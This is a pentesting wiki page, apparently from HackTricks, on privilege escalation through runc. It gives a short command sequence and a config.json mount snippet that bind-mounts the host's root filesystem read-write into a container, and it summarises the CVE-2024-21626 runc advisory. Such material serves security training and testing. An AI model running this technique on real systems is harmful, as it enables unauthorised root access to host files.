# RunC Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Basic information

If you want to learn more about **runc** check the following page:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

If `runc` is available to a rootful process on the host, you can use an OCI bundle whose mount configuration recursively bind-mounts the host's `/` at `/` inside the container, exposing the host filesystem in that mount namespace.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
    "type": "bind",
    "source": "/",
    "destination": "/",
    "options": [
        "rbind",
        "rw",
        "rprivate"
    ]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```

> [!CAUTION]
> The documented `runc run` workflow is rootful: runc's own examples label it "run as root." An unprivileged user needs a rootless configuration such as `runc spec --rootless`, and runc documents that user namespaces must be enabled for that mode.<sup>[[1]](#references)</sup>

## Privileged wrappers and runtime versions

A privileged wrapper that accepts a caller-controlled OCI bundle can expose host files if it permits unsafe bind mounts. Check whether the wrapper resolves traversal and symlinks before validating mount sources and destinations, and whether it constrains `process.cwd`. A sudo rule or a writable `config.json` alone does not prove that the wrapper will accept the bundle or run it with host privileges.

Separately, [CVE-2024-21626](https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv) affected upstream `runc` versions from `1.0.0-rc93` through `1.1.11`; `1.1.12` contains the upstream fix. Leaked file descriptors and insufficient working-directory validation could place a container process outside its root during certain `runc run` or `runc exec` workflows. File-descriptor numbers depend on the invocation, and a version string does not establish exploitability when a vendor has backported fixes or the caller cannot influence a privileged runtime invocation.

## References

- [1] [runc: CLI tool for spawning and running containers](https://github.com/opencontainers/runc#using-runc)
- [2] [OCI Runtime Specification: Mounts](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [Shared Subtrees](https://docs.kernel.org/filesystems/sharedsubtree.html)

{{#include ../../banners/hacktricks-training.md}}
